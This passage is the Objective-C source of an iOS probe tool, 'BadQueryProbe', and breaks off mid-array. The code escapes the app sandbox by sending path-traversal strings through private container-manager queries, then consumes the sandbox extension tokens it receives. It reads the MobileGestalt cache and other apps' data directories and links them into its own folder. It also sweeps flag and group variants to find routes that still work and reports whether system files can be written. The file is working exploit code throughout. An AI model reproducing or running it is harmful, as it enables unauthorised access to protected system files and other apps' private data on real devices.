// BadQueryProbe — see BadQueryProbe.h. Runs synchronously on the caller's
// queue; call from a background queue once.

#import "BadQueryProbe.h"
#import "bad_query.h"
#import "FFLogger.h"
#import "MCMManager.h"

#import <CommonCrypto/CommonDigest.h>
#import <UIKit/UIKit.h>
#import <dirent.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <stdlib.h>
#import <string.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <unistd.h>
#import <xpc/xpc.h>

static NSString *const kBadQueryDirectoryName = @"[BadQuery] Escaped";

static NSMutableString *gLog;

static NSString *sha256Hex(NSData *data)
{
    if (!data) return @"";
    unsigned char digest[CC_SHA256_DIGEST_LENGTH] = {0};
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (NSUInteger i = 0; i < CC_SHA256_DIGEST_LENGTH; i++)
        [hex appendFormat:@"%02x", digest[i]];
    return hex;
}

// Forward declarations (defined after BadQueryConsumeCombo).
static int64_t BadQueryConsumeCombo(NSString *targetPath, NSString *group,
                                    uint64_t flags, uint64_t part, BOOL traversal);
static int64_t BadQueryConsumeComboClass(uint64_t containerClass,
                                         NSString *identifier, BOOL groupIdentifiers,
                                         NSString *targetPath, uint64_t flags,
                                         uint64_t part, BOOL traversal);
static NSMutableDictionary *runConfirmedEscape(NSString *name, NSString *path,
                                               uint64_t flags, uint64_t part,
                                               BOOL traversal);
static NSMutableDictionary *runHandleProbe(void);
static NSMutableDictionary *runWriteProbe(void);
static NSString *badQueryToken(NSString *targetPath, NSString *group,
                               uint64_t flags, uint64_t part, BOOL traversal);
static NSMutableDictionary *runCmgProbe(void);

static NSString *probeRoot(void)
{
    NSString *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    return [documents stringByAppendingPathComponent:@"Device Storage"];
}

static void logLine(NSString *line)
{
    NSString *stamp = [NSDateFormatter localizedStringFromDate:NSDate.date
        dateStyle:NSDateFormatterNoStyle timeStyle:NSDateFormatterMediumStyle];
    NSString *full = [NSString stringWithFormat:@"[%@] %@\n", stamp, line];
    FFLogTag(@"BadQueryProbe", @"%@", line);
    @synchronized (gLog) {
        [gLog appendString:full];
        NSString *logPath = [[probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Log.txt"] stringByStandardizingPath];
        NSString *dir = logPath.stringByDeletingLastPathComponent;
        [[NSFileManager defaultManager] createDirectoryAtPath:dir
            withIntermediateDirectories:YES attributes:nil error:nil];
        // Rewrite the accumulated log (the old code only kept the last line).
        [gLog writeToFile:logPath atomically:YES
            encoding:NSUTF8StringEncoding error:nil];
    }
}

static void logStep(BOOL ok, NSString *step, NSString *detail)
{
    NSString *status = ok ? @"OK  " : @"FAIL";
    if (detail.length) {
        if ([detail containsString:@"\n"])
            detail = [detail stringByReplacingOccurrencesOfString:@"\n" withString:@" | "];
        logLine([NSString stringWithFormat:@"[%@] %-28s %@", status,
            step.UTF8String, detail]);
    } else {
        logLine([NSString stringWithFormat:@"[%@] %@", status, step]);
    }
}

static NSString *strerr(int code)
{
    return [NSString stringWithUTF8String:strerror(code)] ?: @"unknown";
}

static NSDictionary *environmentInfo(void)
{
    char machine[64] = {0};
    char build[64] = {0};
    size_t machineSize = sizeof(machine);
    size_t buildSize = sizeof(build);
    if (sysctlbyname("hw.machine", machine, &machineSize, NULL, 0) != 0) strcpy(machine, "?");
    if (sysctlbyname("kern.osversion", build, &buildSize, NULL, 0) != 0) strcpy(build, "?");
    return @{
        @"Machine": @(machine),
        @"Build": @(build),
        @"SystemVersion": UIDevice.currentDevice.systemVersion ?: @"?",
        @"BundleIdentifier": NSBundle.mainBundle.bundleIdentifier ?: @"?",
        @"RequiredMCMIdentity": @"com.apple.mobile.MobileHouseArrest",
    };
}

// Optional App Group sacrifice configuration for iOS 26 App Group access:
// <Documents>/AppGroupSacrifice.plist -> { "GroupId": "group.your.group" }
static NSString *sacrificeGroupId(void)
{
    NSString *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [documents stringByAppendingPathComponent:@"AppGroupSacrifice.plist"];
    NSDictionary *config = [NSDictionary dictionaryWithContentsOfFile:path];
    NSString *groupId = [config[@"GroupId"] isKindOfClass:NSString.class] ? config[@"GroupId"] : nil;
    return groupId.length ? groupId : nil;
}

// Symlink an escaped path into the probe folder so it can be browsed.
static void installEscapedLink(NSString *name, NSString *target)
{
    NSString *folder = [probeRoot() stringByAppendingPathComponent:kBadQueryDirectoryName];
    [[NSFileManager defaultManager] createDirectoryAtPath:folder
        withIntermediateDirectories:YES attributes:@{NSFilePosixPermissions: @0700} error:nil];
    NSString *link = [folder stringByAppendingPathComponent:name];
    struct stat status = {0};
    if (lstat(link.fileSystemRepresentation, &status) == 0) {
        if (S_ISLNK(status.st_mode)) unlink(link.fileSystemRepresentation);
        else return;
    }
    if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0)
        logStep(NO, @"symlink", [NSString stringWithFormat:@"%@ errno=%d", link, errno]);
}

static NSMutableDictionary *runSingleProbe(NSString *name, NSString *path,
                                           BOOL useGroupRoute)
{
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    result[@"Name"] = name;
    result[@"Path"] = path;
    result[@"GroupRoute"] = @(useGroupRoute);

    logLine([NSString stringWithFormat:@"==== probe: %@ (%@) group=%d", name, path, useGroupRoute]);

    // 1. Precondition: absolute path sanity.
    if (![path hasPrefix:@"/"]) {
        result[@"Status"] = @"skipped";
        result[@"Error"] = @"path is not absolute";
        logStep(NO, @"precheck", @"path is not absolute");
        return result;
    }
    struct stat pre = {0};
    errno = 0;
    BOOL preExists = lstat(path.fileSystemRepresentation, &pre) == 0;
    result[@"PrecheckExists"] = @(preExists);
    result[@"PrecheckErrno"] = @(preExists ? 0 : errno);
    logStep(YES, @"precheck lstat", preExists
        ? @"path exists"
        : [NSString stringWithFormat:@"path missing (errno=%d %@)", errno, strerr(errno)]);

    // 2. dlopen.
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"dlopen";
        result[@"Error"] = [NSString stringWithFormat:@"dlopen errno=%d", errno];
        logStep(NO, @"dlopen", @"libsystem_containermanager");
        return result;
    }
    logStep(YES, @"dlopen", @"libsystem_containermanager");

    // 3. Resolve every symbol individually.
    const char *symbols[] = {
        "container_query_create",
        "container_query_set_class",
        "container_query_set_group_identifiers",
        "container_query_operation_set_flags",
        "container_query_operation_set_part",
        "container_query_operation_set_part_domain",
        "container_query_get_single_result",
        "container_query_free",
        "container_copy_sandbox_token",
        NULL,
    };
    void *resolved[9];
    for (int i = 0; symbols[i]; i++) {
        resolved[i] = dlsym(mgr, symbols[i]);
        logStep(resolved[i] != NULL, [NSString stringWithFormat:@"dlsym %s", symbols[i]],
            resolved[i] ? @"resolved" : @"missing");
        if (!resolved[i]) {
            dlclose(mgr);
            result[@"Status"] = @"failed";
            result[@"Stage"] = [NSString stringWithFormat:@"dlsym %s", symbols[i]];
            result[@"Error"] = @"symbol missing on this OS";
            return result;
        }
    }
    void *(*query_create)(void) = resolved[0];
    void (*query_set_class)(void *, uint64_t) = resolved[1];
    void (*query_set_group_identifiers)(void *, xpc_object_t) = resolved[2];
    void (*query_set_flags)(void *, uint64_t) = resolved[3];
    void (*query_set_part)(void *, uint64_t) = resolved[4];
    void (*query_set_part_domain)(void *, const char *) = resolved[5];
    void *(*query_get_single_result)(void *) = resolved[6];
    void (*query_free)(void *) = resolved[7];
    char *(*copy_sandbox_token)(void *) = resolved[8];
    int64_t (*consume_extension)(const char *) =
        (int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    logStep(consume_extension != NULL, @"dlsym sandbox_extension_consume",
        consume_extension ? @"resolved" : @"missing");
    if (!consume_extension) {
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"dlsym sandbox_extension_consume";
        result[@"Error"] = @"sandbox_extension_consume missing";
        return result;
    }

    // 4. Build the query exactly like bad_query.c.
    void *query = query_create();
    logStep(query != NULL, @"container_query_create", query ? @"created" : @"NULL");
    if (!query) {
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"container_query_create";
        result[@"Error"] = @"NULL query";
        return result;
    }

    // Class 13 (system group, routes to containermanagerd_system) with the
    // MobileGestalt group as the whitelisted starting point; or class 7
    // (app group, containermanagerd) with a caller-owned group.
    uint64_t containerClass;
    NSString *groupIdentifier;
    NSString *traversal;
    if (useGroupRoute) {
        containerClass = 7;
        groupIdentifier = sacrificeGroupId() ?: @"group.com.apple.mobilegestaltcache";
        traversal = [NSString stringWithFormat:@"../../../../../../../../..%@", path];
    } else {
        containerClass = 13;
        groupIdentifier = @"systemgroup.com.apple.mobilegestaltcache";
        traversal = [NSString stringWithFormat:@"../../../../../../../..%@", path];
    }
    query_set_class(query, containerClass);
    logStep(YES, @"query_set_class", [NSString stringWithFormat:@"class=%llu", containerClass]);
    xpc_object_t identifier = xpc_string_create(groupIdentifier.UTF8String);
    query_set_group_identifiers(query, identifier);
    logStep(YES, @"query_set_group_identifiers", groupIdentifier);
    query_set_part(query, 3);
    logStep(YES, @"query_set_part", @"part=3 (Library/Caches start point)");
    query_set_part_domain(query, traversal.UTF8String);
    logStep(YES, @"query_set_part_domain", traversal);
    uint64_t flags = useGroupRoute ? 0x0000000800000000ULL : 0x0000008000000000ULL;
    query_set_flags(query, flags);
    logStep(YES, @"query_set_flags", [NSString stringWithFormat:@"flags=0x%016llx", flags]);
    result[@"Class"] = @(containerClass);
    result[@"GroupIdentifier"] = groupIdentifier;
    result[@"Traversal"] = traversal;
    result[@"Flags"] = [NSString stringWithFormat:@"0x%016llx", flags];

    // 5. Round trip to containermanagerd.
    void *queryResult = query_get_single_result(query);
    logStep(queryResult != NULL, @"container_query_get_single_result",
        queryResult ? @"returned object" : @"NULL (denied outside of sandbox?)");
    if (!queryResult) {
#if !OS_OBJECT_USE_OBJC
        xpc_release(identifier);
#endif
        query_free(query);
        dlclose(mgr);
        result[@"Status"] = @"denied";
        result[@"Stage"] = @"container_query_get_single_result";
        result[@"Error"] = @"query returned NULL (no sandbox token)";
        return result;
    }

    // 6. Token + consume.
    char *token = copy_sandbox_token(queryResult);
    logStep(token != NULL, @"container_copy_sandbox_token", token ? @"token obtained" : @"NULL");
    if (!token) {
#if !OS_OBJECT_USE_OBJC
        xpc_release(identifier);
#endif
        query_free(query);
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"container_copy_sandbox_token";
        result[@"Error"] = @"kernel refused to issue token";
        return result;
    }
    int64_t handle = consume_extension(token);
    logStep(handle >= 0, @"sandbox_extension_consume",
        handle >= 0 ? [NSString stringWithFormat:@"handle=%lld", handle] : @"consume failed");
    free(token);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    query_free(query);
    dlclose(mgr);
    if (handle < 0) {
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"sandbox_extension_consume";
        result[@"Error"] = @"consume returned negative handle";
        return result;
    }
    result[@"Handle"] = @(handle);

    // 7. Verification: access() + open() on the escaped path.
    errno = 0;
    BOOL readable = access(path.UTF8String, R_OK) == 0;
    result[@"Readable"] = @(readable);
    result[@"AccessErrno"] = @(readable ? 0 : errno);
    logStep(readable, @"access R_OK", readable ? @"readable"
        : [NSString stringWithFormat:@"not readable (errno=%d %@)", errno, strerr(errno)]);

    struct stat post = {0};
    errno = 0;
    BOOL statOk = lstat(path.fileSystemRepresentation, &post) == 0;
    result[@"StatOk"] = @(statOk);
    result[@"StatErrno"] = @(statOk ? 0 : errno);
    if (statOk) {
        result[@"Mode"] = [NSString stringWithFormat:@"%04o", post.st_mode & 07777];
        result[@"UID"] = @(post.st_uid);
        result[@"GID"] = @(post.st_gid);
        result[@"IsDirectory"] = @(S_ISDIR(post.st_mode));
        logStep(YES, @"lstat", [NSString stringWithFormat:@"mode=%04o uid=%u gid=%u",
            post.st_mode & 07777, post.st_uid, post.st_gid]);
    }

    int flags2 = O_RDONLY | O_CLOEXEC | (S_ISDIR(post.st_mode) ? O_DIRECTORY : 0);
    errno = 0;
    int fd = open(path.UTF8String, flags2);
    BOOL openOk = fd >= 0;
    result[@"Openable"] = @(openOk);
    result[@"OpenErrno"] = @(openOk ? 0 : errno);
    logStep(openOk, @"open", openOk ? @"opened" : [NSString stringWithFormat:@"open failed (errno=%d %@)", errno, strerr(errno)]);

    if (S_ISDIR(post.st_mode) && fd >= 0) {
        DIR *dir = fdopendir(fd);
        if (dir) {
            NSUInteger count = 0;
            struct dirent *de;
            while ((de = readdir(dir)) != NULL) {
                if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
                count++;
            }
            closedir(dir);
            result[@"ChildCount"] = @(count);
            logStep(YES, @"readdir", [NSString stringWithFormat:@"%lu entries", (unsigned long)count]);
        } else {
            close(fd);
            result[@"ChildCount"] = @0;
            logStep(NO, @"fdopendir", [NSString stringWithFormat:@"errno=%d", errno]);
        }
    } else if (fd >= 0) {
        close(fd);
    }

    result[@"Status"] = readable || openOk ? @"escaped" : @"token-but-unreadable";
    installEscapedLink([name stringByAppendingString:[NSString stringWithFormat:@" [h%lld]", handle]], path);
    logLine([NSString stringWithFormat:@"---- probe done: %@ => %@", name, result[@"Status"]]);
    return result;
}

// ---- variant matrix ------------------------------------------------------
// On builds where the canonical bad_query route is blocked at token issuance,
// sweep start-group x flags x part x traversal to find any surviving path.
// A token that is issued but not consumed still proves the issuance gate is
// open for that combination.
static NSArray<NSDictionary *> *runVariantMatrix(NSString *targetPath)
{
    NSMutableArray *results = [NSMutableArray array];
    logLine(@"==== variant matrix start ====");

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        logStep(NO, @"matrix dlopen", @"libsystem_containermanager");
        return results;
    }
    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
    void (*query_set_part_domain)(void *, const char *) = dlsym(mgr, "container_query_operation_set_part_domain");
    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
    char *(*copy_sandbox_token)(void *) = dlsym(mgr, "container_copy_sandbox_token");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
        !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free ||
        !copy_sandbox_token) {
        logStep(NO, @"matrix dlsym", @"one or more symbols missing");
        dlclose(mgr);
        return results;
    }
    logStep(YES, @"matrix symbols", @"all resolved");

    NSArray<NSString *> *groups = @[
        @"systemgroup.com.apple.mobilegestaltcache",
        @"systemgroup.com.apple.lsd.iconscache",
        @"systemgroup.com.apple.configurationprofiles",
        @"systemgroup.com.apple.installcoordinationd",
    ];
    NSArray<NSNumber *> *flags = @[
        @(0x900000000ULL),
        @(0x800000000ULL),
        @(0x8100000000ULL),
        @(0x080000000ULL),
    ];
    NSArray<NSNumber *> *parts = @[@0, @3];
    NSArray<NSNumber *> *traversals = @[@NO, @YES];

    for (NSString *group in groups) {
        for (NSNumber *flag in flags) {
            for (NSNumber *part in parts) {
                for (NSNumber *traversal in traversals) {
                    NSMutableDictionary *entry = [NSMutableDictionary dictionary];
                    entry[@"Group"] = group;
                    entry[@"Flags"] = [NSString stringWithFormat:@"0x%llx",
                        flag.unsignedLongLongValue];
                    entry[@"Part"] = part;
                    entry[@"Traversal"] = traversal;

                    void *query = query_create();
                    if (!query) {
                        entry[@"Status"] = @"failed";
                        entry[@"Stage"] = @"query_create";
                        [results addObject:entry];
                        continue;
                    }
                    query_set_class(query, 13);
                    xpc_object_t identifier = xpc_string_create(group.UTF8String);
                    query_set_group_identifiers(query, identifier);
                    query_set_part(query, part.unsignedLongLongValue);
                    if (traversal.boolValue) {
                        NSString *traversalPath =
                            [NSString stringWithFormat:@"../../../../../../../..%@", targetPath];
                        query_set_part_domain(query, traversalPath.UTF8String);
                    }
                    query_set_flags(query, flag.unsignedLongLongValue);

                    void *queryResult = query_get_single_result(query);
                    if (!queryResult) {
                        entry[@"Status"] = @"denied";
                        entry[@"Stage"] = @"get_single_result";
                        query_free(query);
                        [results addObject:entry];
                        continue;
                    }
                    char *token = copy_sandbox_token(queryResult);
                    if (!token) {
                        entry[@"Status"] = @"token-denied";
                        entry[@"Stage"] = @"copy_sandbox_token";
                    } else {
                        entry[@"Status"] = @"TOKEN-OK";
                        free(token);
                    }
                    query_free(query);
                    [results addObject:entry];
                    if ([entry[@"Status"] isEqualToString:@"TOKEN-OK"])
                        logStep(YES, @"matrix hit",
                            [NSString stringWithFormat:@"group=%@ flags=%@ part=%@ traversal=%@",
                                group, entry[@"Flags"], part, traversal]);
                }
            }
        }
    }
    dlclose(mgr);
    NSUInteger ok = 0;
    for (NSDictionary *entry in results)
        if ([entry[@"Status"] isEqualToString:@"TOKEN-OK"]) ok++;
    logStep(YES, @"matrix done",
        [NSString stringWithFormat:@"%lu combos, %lu token-ok",
            (unsigned long)results.count, (unsigned long)ok]);
    return results;
}

// ---- text report ---------------------------------------------------------
// Human-readable plain-text report of the whole probe run, so results can be
// viewed and shared directly from Files without plist handling.
static NSString *buildTextReport(NSDictionary *report)
{
    NSMutableString *text = [NSMutableString string];
    [text appendString:@"============================================================\n"];
    [text appendString:@" FuckFile BadQuery Probe Report\n"];
    [text appendString:@"============================================================\n"];
    NSDictionary *env = [report[@"Environment"] isKindOfClass:NSDictionary.class]
        ? report[@"Environment"] : nil;
    [text appendFormat:@"Generated       : %@\n", report[@"CreatedAt"]];
    [text appendFormat:@"SystemVersion   : %@\n", env[@"SystemVersion"] ?: @"?"];
    [text appendFormat:@"Build           : %@\n", env[@"Build"] ?: @"?"];
    [text appendFormat:@"Machine         : %@\n", env[@"Machine"] ?: @"?"];
    [text appendFormat:@"BundleIdentifier: %@\n", env[@"BundleIdentifier"] ?: @"?"];
    [text appendFormat:@"SacrificeGroup  : %@\n",
        [report[@"SacrificeGroupConfigured"] boolValue] ? @"configured" : @"not configured"];

    NSArray *results = [report[@"Probes"] isKindOfClass:NSArray.class] ? report[@"Probes"] : @[];
    [text appendString:@"\n--- [1] Base probes (class 13, part=3, flags=0x800000000, traversal) ---\n"];
    for (NSDictionary *probe in results) {
        NSString *status = probe[@"Status"] ?: @"?";
        [text appendFormat:@"[%@] %@\n      stage=%@  err=%@\n",
            [status uppercaseString], probe[@"Name"] ?: @"?", probe[@"Stage"] ?: @"",
            probe[@"Error"] ?: @""];
    }

    NSArray *matrix = [report[@"VariantMatrix"] isKindOfClass:NSArray.class]
        ? report[@"VariantMatrix"] : @[];
    NSUInteger tokenOk = 0;
    for (NSDictionary *entry in matrix)
        if ([entry[@"Status"] isEqualToString:@"TOKEN-OK"]) tokenOk++;
    [text appendFormat:@"\n--- [2] Variant matrix (%lu combos, %lu token-ok) ---\n",
        (unsigned long)matrix.count, (unsigned long)tokenOk];
    for (NSDictionary *entry in matrix) {
        if (![entry[@"Status"] isEqualToString:@"TOKEN-OK"]) continue;
        [text appendFormat:@"  group=%@  flags=%@  part=%@  traversal=%@\n",
            entry[@"Group"], entry[@"Flags"], entry[@"Part"], entry[@"Traversal"]];
    }

    NSArray *confirmed = [report[@"ConfirmedEscapes"] isKindOfClass:NSArray.class]
        ? report[@"ConfirmedEscapes"] : @[];
    [text appendString:@"\n--- [3] Confirmed escapes (STRICT: readdir lists / read returns bytes) ---\n"];
    if (confirmed.count == 0) [text appendString:@"(none)\n"];
    for (NSDictionary *entry in confirmed) {
        NSString *status = entry[@"Status"] ?: @"?";
        [text appendFormat:@"[%@] %@  flags=%@  verify=%@\n",
            [status uppercaseString], entry[@"Name"] ?: @"?", entry[@"Flags"],
            entry[@"Verification"] ?: @"-"];
        if ([entry[@"ChildCount"] isKindOfClass:NSNumber.class])
            [text appendFormat:@"      children=%lu\n", (unsigned long)[entry[@"ChildCount"] unsignedIntegerValue]];
        if ([entry[@"BytesRead"] isKindOfClass:NSNumber.class])
            [text appendFormat:@"      bytesRead=%lu\n", (unsigned long)[entry[@"BytesRead"] unsignedIntegerValue]];
        if ([entry[@"Handle"] isKindOfClass:NSNumber.class])
            [text appendFormat:@"      handle=%lld\n", [entry[@"Handle"] longLongValue]];
        if ([entry[@"OpendirErrno"] isKindOfClass:NSNumber.class])
            [text appendFormat:@"      opendirErrno=%ld\n", (long)[entry[@"OpendirErrno"] integerValue]];
        if ([entry[@"ReadOpenErrno"] isKindOfClass:NSNumber.class])
            [text appendFormat:@"      openErrno=%ld\n", (long)[entry[@"ReadOpenErrno"] integerValue]];
        if ([entry[@"ReadErrno"] isKindOfClass:NSNumber.class])
            [text appendFormat:@"      readErrno=%ld\n", (long)[entry[@"ReadErrno"] integerValue]];
    }

    NSDictionary *handleProbe = [report[@"HandleProbe"] isKindOfClass:NSDictionary.class]
        ? report[@"HandleProbe"] : nil;
    [text appendString:@"\n--- [4] Handle semantics probe ---\n"];
    if (!handleProbe) {
        [text appendString:@"(not run)\n"];
    } else {
        [text appendFormat:@"Handles                    : %@\n", handleProbe[@"Handles"]];
        [text appendFormat:@"DistinctForDifferentPaths   : %@\n", handleProbe[@"DistinctForDifferentPaths"]];
        [text appendFormat:@"SameHandleForSamePath       : %@\n", handleProbe[@"SameHandleForSamePath"]];
    }

    NSDictionary *gestaltWrite = [report[@"GestaltWriteVerify"] isKindOfClass:NSDictionary.class]
        ? report[@"GestaltWriteVerify"] : nil;
    [text appendString:@"\n--- [5] MobileGestalt write verification ---\n"];
    if (!gestaltWrite) {
        [text appendString:@"(not run)\n"];
    } else {
        [text appendFormat:@"Path        : %@\n", gestaltWrite[@"Path"] ?: @"?"];
        [text appendFormat:@"Writable    : %@\n", gestaltWrite[@"Writable"]];
        [text appendFormat:@"OpenRW      : %@\n", gestaltWrite[@"OpenRW"]];
        [text appendFormat:@"WriteBack   : %@\n", gestaltWrite[@"WriteBack"]];
        [text appendFormat:@"MarkerRead  : %@\n", gestaltWrite[@"MarkerReadBack"]];
        [text appendFormat:@"Restored    : %@\n", gestaltWrite[@"Restored"]];
        [text appendFormat:@"SHA256Match : %@\n", gestaltWrite[@"SHA256Match"]];
    }

    NSDictionary *writeProbe = [report[@"WriteProbe"] isKindOfClass:NSDictionary.class]
        ? report[@"WriteProbe"] : nil;
    [text appendString:@"\n--- [6] Write capability probe ---\n"];
    if (!writeProbe) {
        [text appendString:@"(not run)\n"];
    } else {
        [text appendFormat:@"GestaltMode    : %@\n", writeProbe[@"GestaltMode"] ?: @"-"];
        [text appendFormat:@"GestaltUID/GID : %@/%@\n", writeProbe[@"GestaltUID"] ?: @"-",
            writeProbe[@"GestaltGID"] ?: @"-"];
        [text appendFormat:@"OwnContainer   : %@\n", writeProbe[@"OwnContainer"] ?: @"-"];
        NSDictionary *scope = [writeProbe[@"Scope"] isKindOfClass:NSDictionary.class]
            ? writeProbe[@"Scope"] : nil;
        if (scope) {
            [text appendFormat:@"Handles        : part0=%@ canonical=%@\n",
                scope[@"HandlePart0"], scope[@"HandleCanonical"]];
            [text appendFormat:@"Root opendir   : %@ (errno=%@)\n",
                scope[@"RootOpendir"], scope[@"RootOpendirErrno"]];
            [text appendFormat:@"Parent opendir : %@ (errno=%@)\n",
                scope[@"ParentOpendir"], scope[@"ParentOpendirErrno"]];
            [text appendFormat:@"Documents opendir: %@ (errno=%@)\n",
                scope[@"DocumentsOpendir"], scope[@"DocumentsOpendirErrno"]];
            [text appendFormat:@"Mkdir          : %@ (errno=%@)\n",
                scope[@"Mkdir"], scope[@"MkdirErrno"]];
            [text appendFormat:@"WriteFile      : %@\n", scope[@"WriteFile"]];
            [text appendFormat:@"ReadBackVerify : %@\n", scope[@"ReadBackVerified"]];
        }
        for (NSString *key in @[@"ActivateFalse", @"ActivateTrue"]) {
            NSDictionary *variant = [writeProbe[key] isKindOfClass:NSDictionary.class]
                ? writeProbe[key] : nil;
            if (!variant) continue;
            [text appendFormat:@"%@ (flag=%@): status=%@ activated=%@ mkdir=%@ errno=%@ write=%@ readback=%@\n",
                key, variant[@"ActivateFlag"], variant[@"Status"], variant[@"Activated"],
                variant[@"Mkdir"], variant[@"MkdirErrno"], variant[@"WriteFile"],
                variant[@"ReadBackVerified"]];
        }
        NSArray *sweep = [writeProbe[@"GestaltSweep"] isKindOfClass:NSArray.class]
            ? writeProbe[@"GestaltSweep"] : @[];
        if (sweep.count > 0) {
            [text appendString:@"Gestalt writable-extension sweep:\n"];
            for (NSDictionary *entry in sweep) {
                [text appendFormat:@"  flags=%@ part=%@ trav=%@ handle=%@ W_OK=%@",
                    entry[@"Flags"], entry[@"Part"], entry[@"Traversal"],
                    entry[@"Handle"], entry[@"Writable"] ?: entry[@"Status"]];
                if ([entry[@"WriteBack"] isKindOfClass:NSNumber.class])
                    [text appendFormat:@" writeBack=%@", entry[@"WriteBack"]];
                if ([entry[@"SHA256Match"] isKindOfClass:NSNumber.class])
                    [text appendFormat:@" shaMatch=%@", entry[@"SHA256Match"]];
                [text appendString:@"\n"];
            }
        }
        NSArray *pivot = [writeProbe[@"PivotSweep"] isKindOfClass:NSArray.class]
            ? writeProbe[@"PivotSweep"] : @[];
        if (pivot.count > 0) {
            [text appendString:@"Class-12 geod pivot + RW-flag sweep:\n"];
            for (NSDictionary *entry in pivot) {
                [text appendFormat:@"  class=%@ id=%@ flags=%@ part=%@ handle=%@ W_OK=%@",
                    entry[@"Class"], entry[@"Identifier"], entry[@"Flags"], entry[@"Part"],
                    entry[@"Handle"], entry[@"Writable"] ?: entry[@"Status"]];
                if ([entry[@"WriteBack"] isKindOfClass:NSNumber.class])
                    [text appendFormat:@" writeBack=%@", entry[@"WriteBack"]];
                if ([entry[@"SHA256Match"] isKindOfClass:NSNumber.class])
                    [text appendFormat:@" shaMatch=%@", entry[@"SHA256Match"]];
                [text appendString:@"\n"];
            }
        }
        NSArray *tokenTypes = [writeProbe[@"TokenTypes"] isKindOfClass:NSArray.class]
            ? writeProbe[@"TokenTypes"] : @[];
        if (tokenTypes.count > 0) {
            [text appendString:@"Sandbox extension token types:\n"];
            for (NSDictionary *entry in tokenTypes) {
                [text appendFormat:@"  %@: %@\n", entry[@"Name"],
                    entry[@"ExtensionClass"] ?: (entry[@"Status"] ?: @"?")];
            }
        }
        NSDictionary *dp = [writeProbe[@"DataProtectionProbe"] isKindOfClass:NSDictionary.class]
            ? writeProbe[@"DataProtectionProbe"] : nil;
        if (dp) {
            [text appendString:@"Data Protection diagnosis:\n"];
            [text appendFormat:@"  ProtectedDataAvailable: %@\n", dp[@"ProtectedDataAvailable"]];
            [text appendFormat:@"  Container             : %@\n", dp[@"Container"] ?: @"-"];
            [text appendFormat:@"  Readdir               : %@\n", dp[@"Readdir"]];
            [text appendFormat:@"  EntriesScanned        : %@\n", dp[@"EntriesScanned"] ?: @"-"];
            [text appendFormat:@"  NoRegularFiles        : %@\n", dp[@"NoRegularFiles"] ?: @"-"];
            [text appendFormat:@"  FirstFile             : %@\n", dp[@"FirstFile"] ?: @"-"];
            [text appendFormat:@"  OpenOK/Errno          : %@/%@\n",
                dp[@"OpenOK"], dp[@"OpenErrno"] ?: @"-"];
            [text appendFormat:@"  ReadOK                : %@\n", dp[@"ReadOK"] ?: @"-"];
        }
        NSDictionary *cmg = [writeProbe[@"CmgProbe"] isKindOfClass:NSDictionary.class]
            ? writeProbe[@"CmgProbe"] : nil;
        NSArray *cmgVariants = [cmg[@"Variants"] isKindOfClass:NSArray.class]
            ? cmg[@"Variants"] : @[];
        if (cmgVariants.count > 0) {
            [text appendString:@"mond/cmg variants:\n"];
            for (NSDictionary *entry in cmgVariants) {
                [text appendFormat:@"  %@\n    activate=%@ openWrite=%@ errno=%@ accMode=%@ writeBack=%@ shaMatch=%@\n",
                    entry[@"Name"], entry[@"Activated"], entry[@"OpenWrite"],
                    entry[@"OpenErrno"] ?: @"-", entry[@"AccMode"] ?: @"-",
                    entry[@"WriteBack"] ?: @"-", entry[@"SHA256Match"] ?: @"-"];
            }
        }
    }

    [text appendString:@"\n--- [7] Full step log ---\n"];
    [text appendString:@"(see BadQuery Probe Log.txt for every step)\n"];
    [text appendString:@"\n============================================================\n"];
    return text;
}

// BadQueryProbeRun: run every probe, write results and a full step log.
// Synchronous; call from a background queue.
static void BadQueryProbeRunInternal(void)
{
        gLog = [NSMutableString string];
        logLine(@"==== BadQueryProbe start ====");
        logLine([NSString stringWithFormat:@"environment: %@", environmentInfo()]);

        NSArray<NSDictionary *> *targets = @[
            @{@"Name": @"MobileGestalt.plist (file)",
              @"Path": @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"},
            @{@"Name": @"MobileGestalt Caches (dir)",
              @"Path": @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"},
            @{@"Name": @"App Data root",
              @"Path": @"/var/mobile/Containers/Data/Application"},
            @{@"Name": @"InternalDaemon root",
              @"Path": @"/var/mobile/Containers/Data/InternalDaemon"},
            @{@"Name": @"PluginKitPlugin root",
